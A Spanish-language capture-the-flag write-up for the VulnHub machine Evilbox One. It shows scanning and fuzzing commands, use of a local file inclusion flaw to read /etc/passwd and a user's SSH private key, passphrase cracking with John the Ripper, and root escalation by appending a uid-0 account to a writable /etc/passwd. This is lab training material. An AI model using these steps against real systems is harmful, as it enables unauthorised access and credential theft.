---
title: Evilbox One
date: 2024-07-13
categories: [WRITEUPS, VulnHub]
tags: [lfi]  # TAG names should always be lowercase
image: /assets/images/vulnhub/logo.png
---

En este ***Writeup*** se engloban las siguientes fases:
- **[Reconocimiento](#reconocimiento)**
- **[Explotación](#explotación)**
- **[Escalada de privilegios](#escalada-de-privilegios)**

---

## **Reconocimiento**

El primer paso es realizar un escaneo de puertos con NMAP, para comprobar que puertos están abiertos.

```bash
nmap -p- --open -T5 192.168.1.156 -n -Pn -v
```

![picture](/assets/images/vulnhub/evilbox1.png){: w="600" h="300" }

A continuación, nos vamos al navegador para ver de que se trata la página web, y comprobamos que se trata de una página por defecto de Apache2.

![picture](/assets/images/vulnhub/evilbox2.png)

Vamos a realizar **Fuzzing** con **Gobuster**, para ver si encontramos rutas y archivos que no podamos ver desde un primer momento.

```bash
gobuster dir -u http://192.168.1.156 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .txt,.php,.html,.sh,.png,.jpg,.jpeg -b 404,403
```

![picture](/assets/images/vulnhub/evilbox3.png)

Dentro del archivo "*robots.txt*" encontramos un comentario.

![picture](/assets/images/vulnhub/evilbox4.png)

Dentro de la ruta "*/secret*" encontrada no hay contenido, así que volvemos a realizar **Fuzzing** añadiendo la ruta entera.

```bash
gobuster dir -u http://192.168.1.156/secret -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .txt,.php,.html,.sh,.png,.jpg,.jpeg -b 404,403
```

Y encontramos un archivo llamado "***evil.php***".

![picture](/assets/images/vulnhub/evilbox5.png)

----

## **Explotación**

A continuación, vamos a intentar explotar un **LFI** (*Local File Inclusion*), que es la capacidad de poder leer archivos internos de la máquina.

Para ello realizaremos un *ataque de diccionario* para intentar encontrar algún parámetro por el cual podamos leer el archivo "*/etc/passwd*".

Utilizaremos la herramienta **FFUF**, escrita en **Go**, y para indicarle donde queremos que pruebe el diccionario, escribiremos el parámetro **FUZZ** como se puede ver en el comando.

```bash
wfuzz -c --hc=404,403 --hw=0 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 'http://192.168.1.156/secret/evil.php?FUZZ=/etc/passwd'
```

![picture](/assets/images/vulnhub/evilbox6.png)

Y encontramos el parámetro "***command***". 

Podemos listar archivos locales de la máquina, aunque no podemos ejecutar comandos.

![picture](/assets/images/vulnhub/evilbox7.png){: w="600" h="300" }

Intentando mostrar la **clave privada** de **SSH** (*id_rsa*) del usuario **mowree**, compruebo que tenemos permisos de lectura. Así que la idea es copiarla y acceder a la máquina con la clave privada.

![picture](/assets/images/vulnhub/evilbox8.png){: w="600" h="300" }

Una vez la clave copiada y traída a nuestra máquina local, creando un archivo llamado "**id_rsa**" con permisos 600, intentamos acceder mediante **SSH**, pero me pide una contraseña, así que lo siguiente será intentar crackear la contraseña con **John The Ripper**.

![picture](/assets/images/vulnhub/evilbox9.png){: w="600" h="300" }

Para ello convertiremos el formato del archivo a uno que **John The Ripper** pueda entender utilizando la herramienta **ssh2john**.

```bash
ssh2john id_rsa > hash.txt
```
Una vez el archivo convertido, ejecutamos **John The Ripper**, y nos encuentra la contraseña con el diccionario **rockyou**.

![picture](/assets/images/vulnhub/evilbox10.png){: w="600" h="300" }

Accedemos mediante **SSH** y la clave.

```bash
ssh -i id_rsa mowree@192.168.1.156
```

Y estamos dentro de la máquina siendo el usuario **mowree**.

![picture](/assets/images/vulnhub/evilbox11.png){: w="600" h="300" }

Dentro de su directorio personal, encontramos la primera **flag**.

![picture](/assets/images/vulnhub/evilbox12.png)

---

## **Escalada de privilegios**

Listando los permisos del archivo *"/etc/passwd"* podemos comprobar que tenemos permisos de escritura.

![picture](/assets/images/vulnhub/evilbox13.png)

La idea para escalar máximos privilegios, será añadir un usuario nuevo con la bash de **root**.

Para ello generaremos una contraseña cifrada.

```bash
openssl passwd -1 -salt xyz password
```

![picture](/assets/images/vulnhub/evilbox20.png)

Y a continuación, añadiremos el usuario al /etc/passwd.

```bash
echo  'pwned:$1$xyz$QeYhJjMn0Cz1qxjZ5Pl4q1:0:0:root:/root:/bin/bash' >> /etc/passwd
```

![picture](/assets/images/vulnhub/evilbox14.png){: w="600" h="300" }

Migramos al usuario **pwned**, y nos devuelve la bash como **root**, y en la carpeta personal, podemos leer la segunda **flag**.

![picture](/assets/images/vulnhub/evilbox15.png){: w="600" h="300" }
